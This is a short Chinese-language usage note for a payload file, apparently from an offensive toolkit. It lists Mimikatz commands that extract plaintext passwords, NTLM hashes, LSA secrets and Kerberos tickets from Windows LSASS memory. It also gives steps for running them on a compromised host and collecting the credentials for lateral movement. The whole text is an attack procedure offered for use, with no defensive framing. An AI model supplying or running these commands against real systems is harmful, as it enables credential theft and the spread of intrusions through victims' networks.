## 📦 载荷使用说明：mimikatz_commands.txt

### 📝 功能说明
Windows 凭据提取神器。此文本文件包含了一系列常用的 Mimikatz 命令，用于从 LSASS 内存中提取明文密码、NTLM Hash 和 Kerberos 票据。

### ⚙️ 参数说明
```text
- `privilege::debug`：提升至调试权限
- `sekurlsa::logonpasswords`：提取内存中的明文密码和 Hash
- `lsadump::lsa /patch`：提取 LSA 密钥和 Hash
- `sekurlsa::tickets /export`：导出内存中的 Kerberos 票据
```

### 🚀 操作步骤
1. 将 Mimikatz 二进制文件上传至已攻陷的 Windows 主机。
2. 以管理员权限（或 SYSTEM 权限）运行命令行。
3. 启动 Mimikatz 并依次执行此文件中的命令，或使用重定向：`mimikatz.exe < mimikatz_commands.txt`。
4. 收集输出的凭据信息用于横向移动。
